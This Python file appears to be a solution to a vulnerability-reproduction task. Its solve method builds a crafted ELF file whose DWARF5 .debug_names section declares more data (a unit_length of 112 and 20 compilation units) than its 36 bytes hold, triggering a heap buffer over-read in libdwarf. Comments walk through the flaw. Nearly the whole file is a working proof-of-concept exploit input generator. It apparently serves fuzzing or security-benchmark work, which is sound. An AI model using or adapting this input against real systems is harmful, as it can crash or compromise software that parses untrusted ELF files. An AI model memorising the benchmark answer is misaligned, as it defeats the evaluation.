import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Helper functions for packing binary data (Little Endian)
        def p8(x): return struct.pack('<B', x)
        def p16(x): return struct.pack('<H', x)
        def p32(x): return struct.pack('<I', x)
        def p64(x): return struct.pack('<Q', x)

        # -------------------------------------------------------------------------
        # Vulnerability Strategy: Heap Buffer Overflow in .debug_names
        # -------------------------------------------------------------------------
        # The vulnerability lies in the handling of the DWARF5 .debug_names section.
        # We construct an ELF file with a valid .debug_names section header but 
        # corrupted content.
        #
        # 1. The ELF section header (sh_size) declares a small size (e.g., 36 bytes),
        #    causing libdwarf to allocate a small buffer.
        # 2. The DWARF unit header inside declares a larger `unit_length` and 
        #    non-zero counts (e.g., comp_unit_count=20), implying more data follows.
        # 3. libdwarf calculates limits based on the larger `unit_length` or blindly
        #    iterates based on counts, failing to validate against the actual 
        #    allocation size derived from sh_size.
        # 4. This results in a Heap Buffer Over-read when accessing the missing entries.
        # -------------------------------------------------------------------------

        # --- 1. Construct .debug_names Payload ---
        
        # DWARF5 Header Fields
        version = 5
        padding = 0
        comp_unit_count = 20        # Claims 20 CUs exist
        local_type_unit_count = 0
        foreign_type_unit_count = 0
        bucket_count = 0
        name_count = 0
        abbrev_table_size = 0
        aug_str_size = 0
        
        # Header body (32 bytes)
        dnames_body = (
            p16(version) +
            p16(padding) +
            p32(comp_unit_count) +
            p32(local_type_unit_count) +
            p32(foreign_type_unit_count) +
            p32(bucket_count) +
            p32(name_count) +
            p32(abbrev_table_size) +
            p32(aug_str_size)
        )

        # Calculate `unit_length`
        # We claim the unit contains the header body (32) + the CU list (20 * 4 = 80 bytes).
        # Total claimed size = 112 bytes.
        unit_length = 112
        
        # Actual payload data (Truncated)
        # We only provide the length and the header body. We omit the CU list.
        # Total provided bytes = 4 + 32 = 36 bytes.
        dnames_data = p32(unit_length) + dnames_body

        # --- 2. Construct ELF Container ---

        # Section Header String Table (.shstrtab)
        # Contains names: \x00, .shstrtab, .debug_names
        shstrtab = b'\x00.shstrtab\x00.debug_names\x00'
        
        # Calculate file offsets
        # ELF Header: 64 bytes
        # Section Headers: 3 entries * 64 bytes = 192 bytes
        # Total headers size = 256 bytes
        offset_shstrtab = 256
        len_shstrtab = len(shstrtab)
        
        offset_dnames = offset_shstrtab + len_shstrtab
        len_dnames = len(dnames_data) # 36 bytes
        
        # ELF Header (64-bit, Little Endian, System V)
        e_ident = b'\x7fELF' + bytes([2, 1, 1, 0]) + b'\x00' * 8
        ehdr = (
            e_ident +
            p16(1) +      # e_type (ET_REL)
            p16(62) +     # e_machine (EM_X86_64)
            p32(1) +      # e_version
            p64(0) +      # e_entry
            p64(0) +      # e_phoff
            p64(64) +     # e_shoff (immediately after ELF header)
            p32(0) +      # e_flags
            p16(64) +     # e_ehsize
            p16(0) +      # e_phentsize
            p16(0) +      # e_phnum
            p16(64) +     # e_shentsize
            p16(3) +      # e_shnum (NULL, .shstrtab, .debug_names)
            p16(1)        # e_shstrndx (.shstrtab index)
        )
        
        # Section Header 0: NULL
        sh_null = b'\x00' * 64
        
        # Section Header 1: .shstrtab
        # Name offset 1 points to ".shstrtab"
        sh_shstrtab = (
            p32(1) +             # sh_name
            p32(3) +             # sh_type (SHT_STRTAB)
            p64(0) +             # sh_flags
            p64(0) +             # sh_addr
            p64(offset_shstrtab) + # sh_offset
            p64(len_shstrtab) +  # sh_size
            p32(0) +             # sh_link
            p32(0) +             # sh_info
            p64(1) +             # sh_addralign
            p64(0)               # sh_entsize
        )
        
        # Section Header 2: .debug_names
        # Name offset 11 points to ".debug_names"
        sh_dnames = (
            p32(11) +            # sh_name
            p32(1) +             # sh_type (SHT_PROGBITS)
            p64(0) +             # sh_flags
            p64(0) +             # sh_addr
            p64(offset_dnames) + # sh_offset
            p64(len_dnames) +    # sh_size (36 bytes - the trap)
            p32(0) +             # sh_link
            p32(0) +             # sh_info
            p64(1) +             # sh_addralign
            p64(0)               # sh_entsize
        )
        
        # Assemble Final ELF
        return ehdr + sh_null + sh_shstrtab + sh_dnames + shstrtab + dnames_data
